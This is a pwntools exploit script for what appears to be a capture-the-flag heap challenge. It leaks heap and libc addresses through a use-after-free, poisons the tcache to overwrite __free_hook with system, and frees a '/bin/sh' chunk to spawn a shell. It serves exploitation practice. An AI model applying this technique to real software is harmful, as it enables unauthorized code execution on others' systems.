#!/usr/bin/env python3

import re

from pwn import *


exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("chall.k1nd4sus.it", 30500)

    return r


def allocate(size: int) -> int:
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", str(size).encode())
    pos = int(re.match(rb"Chunk (\d+) allocated", r.recvline()).group(1))
    return pos


def edit(idx: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Data: ", data)


def view(idx: int, lines: int = 1) -> bytes:
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())
    return r.recvlines(lines)[-1]


def delete(idx: int):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"Index: ", str(idx).encode())


def main():
    r = conn()

    # Leak heap
    A = allocate(0x28)
    delete(A)
    edit(A, b"A" * 7)
    heap = u64(view(A, 2).ljust(8, b"\x00")) & 0xFFFFFFFFFFFFF000
    log.info(f"heap: 0x{heap:x}")
   
    # Prepare big chunk for libc leak
    A = allocate(0x418)
    B = allocate(0x28)
    C = allocate(0x28)

    delete(A)
    libc.address = u64(view(A).ljust(8, b"\x00")) - 0x1ecbe0
    log.info(f"libc: 0x{libc.address:x}")

    # Prepare for tcache poisoning
    delete(C)
    delete(B)

    # Overwrite `__free_hook` with `system`
    edit(B, p64(libc.sym.__free_hook - 0x8))
    B = allocate(0x28)
    C = allocate(0x28)
    edit(C, b"A" * 8 + p64(libc.sym.system))

    # Enjoy shell
    CMD = allocate(0x48)
    edit(CMD, b"/bin/sh\x00")
    delete(CMD)

    r.interactive("$ ")


if __name__ == "__main__":
    main()

